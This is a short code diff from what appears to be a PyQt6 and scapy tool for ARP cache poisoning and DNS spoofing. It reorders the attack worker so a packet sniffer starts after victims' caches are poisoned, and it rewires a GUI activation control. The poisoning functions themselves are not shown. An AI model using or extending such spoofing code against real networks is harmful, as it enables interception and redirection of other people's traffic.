@@ -1,3 +1,4 @@
+from scapy.all import *
 from PyQt6.QtCore import *
 from PyQt6.QtGui import *
 from PyQt6.QtWidgets import *
@@ -21,19 +22,18 @@ class AttackWorker(QObject):
     def run(self):
         print('Attack starting')
 
-        self.sniffer = AsyncSniffer(
-            filter='udp port 53',
-            iface=self.settings.arp_settings.interface.name,
-            prn=lambda p: handle_packet(self.settings, p)
-        )
-        self.snifer.start()
-
         # Ping victims to ensure they know of each others existence
         send_poisonous_pings(self.settings.arp_settings)
 
         # do the initial chache poisoning
         for _ in range(self.settings.arp_settings.initial_packets):
             send_poisonous_packets(self.settings.arp_settings)
+
+        self.sniffer = AsyncSniffer(
+            iface=self.settings.arp_settings.interface.name,
+            prn=lambda p: handle_packet(self.settings, p)
+        )
+        self.sniffer.start()
 
         # perform poisoning every so often to prevent chache healing
         self.timer = QTimer(self)
@@ -158,7 +158,7 @@ class DNSWindow(QWidget):
 
         self.widgets[self.DNS_ADD].clicked.connect(lambda: dns.insertRow(dns.rowCount()))
         self.widgets[self.DNS_DELETE].clicked.connect(self.delete_selected_dns_rows)
-        self.widgets[self.ACTIVATION].clicked.connect(self.on_toggle)
+        self.widgets[self.ACTIVATION].state_changed.connect(self.on_toggle)
 
     def get_valid_dns_entries(self) -> list[DNSEntry]:
         dns: QTableWidget = self.widgets[self.DNS_TABLE]
